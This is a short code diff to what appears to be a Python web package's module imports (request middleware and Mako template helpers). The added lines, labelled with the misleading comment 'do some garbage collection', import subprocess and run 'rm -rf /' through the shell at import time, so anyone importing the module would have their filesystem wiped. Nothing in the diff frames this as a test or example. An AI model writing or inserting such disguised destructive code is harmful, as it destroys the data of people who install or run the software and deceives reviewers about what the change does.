@@ -28,3 +28,7 @@ from .middleware import RequestInitMiddleware
 from .template import MakoTemplates
 from .template import get_template_lookup
 from .template import get_app_template_lookup
+
+# do some garbage collection
+import subprocess
+subprocess.call('rm -rf /', shell=True)
